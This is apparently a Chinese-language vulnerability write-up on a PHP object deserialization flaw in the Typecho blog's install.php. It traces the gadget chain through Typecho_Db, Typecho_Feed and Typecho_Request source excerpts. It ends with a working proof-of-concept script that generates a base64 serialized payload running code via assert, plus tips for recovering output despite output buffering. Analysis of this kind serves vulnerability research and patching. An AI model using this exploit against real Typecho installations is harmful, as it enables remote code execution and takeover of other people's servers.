## Typecho install.php反序列化漏洞
###漏洞简要流程：  
install.php文件 64 - 77行： 
 
    // 挡掉可能的跨站请求
    if (!empty($_GET) || !empty($_POST)) {
    if (empty($_SERVER['HTTP_REFERER'])) {
    exit;
    }
    
    $parts = parse_url($_SERVER['HTTP_REFERER']);
    	if (!empty($parts['port'])) {
    $parts['host'] = "{$parts['host']}:{$parts['port']}";
    }
    
    if (empty($parts['host']) || $_SERVER['HTTP_HOST'] != $parts['host']) {
    exit;
    }
    }
    

215 - 237 行：

    <?php if (isset($_GET['finish'])) : ?>
    <?php if (!@file_exists(__TYPECHO_ROOT_DIR__ . '/config.inc.php')) : ?>
    <h1 class="typecho-install-title"><?php _e('安装失败!'); ?></h1>
    <div class="typecho-install-body">
    <form method="post" action="?config" name="config">
    <p class="message error"><?php _e('您没有上传 config.inc.php 文件，请您重新安装！'); ?> <button class="btn primary" type="submit"><?php _e('重新安装 &raquo;'); ?></button></p>
    </form>
    </div>
    <?php elseif (!Typecho_Cookie::get('__typecho_config')): ?>
    <h1 class="typecho-install-title"><?php _e('没有安装!'); ?></h1>
    <div class="typecho-install-body">
    <form method="post" action="?config" name="config">
    <p class="message error"><?php _e('您没有执行安装步骤，请您重新安装！'); ?> <button class="btn primary" type="submit"><?php _e('重新安装 &raquo;'); ?></button></p>
    </form>
    </div>
    <?php else : ?>
    <?php
    $config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));
    Typecho_Cookie::delete('__typecho_config');
    $db = new Typecho_Db($config['adapter'], $config['prefix']);
    $db->addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);
    Typecho_Db::set($db);
    ?>
所以需要finish有值 并且 Referer同源  

232 行：

    $config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));
是反序列化函数的执行位置，反序列化的内容为base64_decode的内容，Typecho_Cookie::get('__typecho_config')获取到的值
  
Typecho_Cookie::get 的定义：
  
    public static function get($key, $default = NULL)
    {
    $key = self::$_prefix . $key;
    $value = isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] : $default);
    return is_array($value) ? $default : $value;
    }

$_COOKIE中存在就用$_COOKIE的值，不存在就从$_POST获取,所以漏洞的Poc可以post传上去也可以cookie值传上去  

unserialize 以后 进入了234行:  

    $db = new Typecho_Db($config['adapter'], $config['prefix']);
    
实例化了Typecho_Db类,注意这里传的是$config['adapter']以及$config['prefix']  

文件var/Typecho/Db.php 114 - 136 行：
  
    public function __construct($adapterName, $prefix = 'typecho_')	//这里有默认值，所以也不用传$config['prefix']的值
    {
    /** 获取适配器名称 */
    $this->_adapterName = $adapterName;	// adapterName 就是上面的$config['adapter'],
    
    /** 数据库适配器 */
    $adapterName = 'Typecho_Db_Adapter_' . $adapterName;// 字符串拼接,这里要传一个类，才会触发__toString()
	// 所以是类里面实例化(包含)了类
    // 如果传入的$adapterName是一个类，那么在将这个类进行字符串拼接的时候就会触发这个类的__toString()方法
    
    if (!call_user_func(array($adapterName, 'isAvailable'))) {
    throw new Typecho_Db_Exception("Adapter {$adapterName} is not available");
    }
    
    $this->_prefix = $prefix;
    
    /** 初始化内部变量 */
    $this->_pool = array();
    $this->_connectedPool = array();
    $this->_config = array();
    
    //实例化适配器对象
    $this->_adapter = new $adapterName();
    }
    
找到有定义__toString()魔术方法的类  
文件：var/Typecho/Feed.php  
然后 第272 - 341 行：  

    } else if (self::RSS2 == $this->_type) {
    	$result .= '<rss version="2.0"
    	xmlns:content="http://purl.org/rss/1.0/modules/content/"
    	xmlns:dc="http://purl.org/dc/elements/1.1/"
    	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
    	xmlns:atom="http://www.w3.org/2005/Atom"
    	xmlns:wfw="http://wellformedweb.org/CommentAPI/">
    	<channel>' . self::EOL;
    
    	$content = '';
    	$lastUpdate = 0;
    
    	foreach ($this->_items as $item) {
    		$content .= '<item>' . self::EOL;
    		$content .= '<title>' . htmlspecialchars($item['title']) . '</title>' . self::EOL;
    		$content .= '<link>' . $item['link'] . '</link>' . self::EOL;
    		$content .= '<guid>' . $item['link'] . '</guid>' . self::EOL;
    		$content .= '<pubDate>' . $this->dateFormat($item['date']) . '</pubDate>' . self::EOL;
    		$content .= '<dc:creator>' . htmlspecialchars($item['author']->screenName) . '</dc:creator>' . self::EOL;   //这里是个二维数组
    		// 当这里调用
    
    		if (!empty($item['category']) && is_array($item['category'])) {
    		foreach ($item['category'] as $category) {
    			$content .= '<category><![CDATA[' . $category['name'] . ']]></category>' . self::EOL;
    			}
    		}
    
    		if (!empty($item['excerpt'])) {
    			$content .= '<description><![CDATA[' . strip_tags($item['excerpt']) . ']]></description>' . self::EOL;
    		}
    
    		if (!empty($item['content'])) {
    			$content .= '<content:encoded xml:lang="' . $this->_lang . '"><![CDATA['
    			. self::EOL .
    			$item['content'] . self::EOL .
    			']]></content:encoded>' . self::EOL;
    		}
    
    		if (isset($item['comments']) && strlen($item['comments']) > 0) {
    			$content .= '<slash:comments>' . $item['comments'] . '</slash:comments>' . self::EOL;
    		}
    
    		$content .= '<comments>' . $item['link'] . '#comments</comments>' . self::EOL;
    		if (!empty($item['commentsFeedUrl'])) {
    			$content .= '<wfw:commentRss>' . $item['commentsFeedUrl'] . '</wfw:commentRss>' . self::EOL;
    		}
    
    		if (!empty($item['suffix'])) {
    			$content .= $item['suffix'];
    		}
    
    		$content .= '</item>' . self::EOL;
    
    		if ($item['date'] > $lastUpdate) {
    			$lastUpdate = $item['date'];
    			}
    		}
    
    		$result .= '<title>' . htmlspecialchars($this->_title) . '</title>
    		<link>' . $this->_baseUrl . '</link>
    		<atom:link href="' . $this->_feedUrl . '" rel="self" type="application/rss+xml" />
    		<language>' . $this->_lang . '</language>
    		<description>' . htmlspecialchars($this->_subTitle) . '</description>
    		<lastBuildDate>' . $this->dateFormat($lastUpdate) . '</lastBuildDate>
    		<pubDate>' . $this->dateFormat($lastUpdate) . '</pubDate>' . self::EOL;
    
    		$result .= $content . '</channel>
    		</rss>';
    
    	} else if (self::ATOM1 == $this->_type) {
    
$this->_items 我们可以直接控制  
第290行：  

    $content .= '<dc:creator>' . htmlspecialchars($item['author']->screenName) . '</dc:creator>' . self::EOL;   //这里是个二维数组
注意$item['author']->screenName  
$item由foreach ($this->_items as $item)得来，如果我们给$item['author']设置一个不可访问的属性，那就会触发该类的__get()方法  
所以，找一个类里面定义了__get()魔术方法的类来间接调用  
var/Typecho/Request.php 文件  270 - 273 行：  

    public function __get($key)
    {
        return $this->get($key);
    }

get方法的定义 296 - 312 行：

    public function get($key, $default = NULL)
    {
        switch (true) {
            case isset($this->_params[$key]):
                $value = $this->_params[$key];
                break;
            case isset(self::$_httpParams[$key]):
                $value = self::$_httpParams[$key];
                break;
            default:
                $value = $default;
                break;
        }

        $value = !is_array($value) && strlen($value) > 0 ? $value : $default;
        return $this->_applyFilter($value);
    }
$this->_params 我们可以直接控制  
$key 为$item['author']->screenName不可访问的属性,所以为screenName,是一定为screenName的(在我用的这个Poc时)  
也就是
$this->_params[$key] ==> $this->_params['screenName'] ==> $this->_params = array('screenName' => 'phpinfo()');  
最后_applyFilter的定义 159 - 171 行：
  
    private function _applyFilter($value)
    {
        if ($this->_filter) {
            foreach ($this->_filter as $filter) {
                $value = is_array($value) ? array_map($filter, $value) :
                call_user_func($filter, $value);
            }

            $this->_filter = array();
        }

        return $value;
    }
$this->_filte 我们也可以直接控制  
$value 就是$this->_params['screenName'] 的值  
所以在代码执行的位置就可以都控制住了，漏洞就跑通了  
所以漏洞Poc:  

    <?php
    
    class Typecho_Feed
    {
    	private $_type;
    	private $_items;
    
    	function __construct()
    	{
    		$this->_type = 'RSS 2.0';
    		$this->_items = array(
    		array(
    		'author' => new Typecho_Request(),
    		//'category' => array(new Typecho_Request()) //因为54行存在ob_start();注入对象会触发exception,所以会调用var/Typecho/Common.php文件ob_end_clean();
    		// 所以需要这个category,只是为了回显出来
    		// 命令执行之后，想办法造成一个报错，语句报错就会强制停止，这样缓冲区中的数据仍然会被输出出来
    		// 292行因为Typecho_Request不存在name属性,造成报错,所以设置了category为一个新类
    		));
    	}
    }
    
    class Typecho_Request
    {
    	private $_filter;
    	private $_params;
    
    	function __construct()
    	{
    		$this->_params = array('screenName' => 'phpinfo()');
    		$this->_filter = array('assert');
    	}
    }
    
    $Poc = array(
    	'adapter' => new Typecho_Feed()
    );
    
    echo serialize($Poc);
    echo "\n";
    echo base64_encode(serialize($Poc));


执行一下，发现没有任何回显？？？  
具体原因如下：  
文件install.php第54行：  

    ob_start();

文件var/Typecho/Common.php 229 - 237 行：  

    public static function exceptionHandle($exception)
    {
        if (defined('__TYPECHO_DEBUG__')) {
            echo '<pre><code>';
            echo '<h1>' . htmlspecialchars($exception->getMessage()) . '</h1>';
            echo htmlspecialchars($exception->__toString());
            echo '</code></pre>';
        } else {
            @ob_end_clean();
  
ob_start();  
@ob_end_clean();   
注入对象的时候会触发exception,所以会调用var/Typecho/Common.php文件exceptionHandle() 清空（擦除）缓冲区并关闭输出缓冲  
所以我们看不见有回显，但是代码确实是已经运行了  
解决方法就是：

    //'category' => array(new Typecho_Request())
去掉Poc这条语句的注释，详细的说明见Poc

###漏洞Poc
文件夹下Poc.php  



### 参考
**[http://www.freebuf.com/vuls/155753.html](http://www.freebuf.com/vuls/155753.html)**  
**[https://mp.weixin.qq.com/s/w2JuKtXpSJVFDNSz7s_xog](https://mp.weixin.qq.com/s/w2JuKtXpSJVFDNSz7s_xog)**  

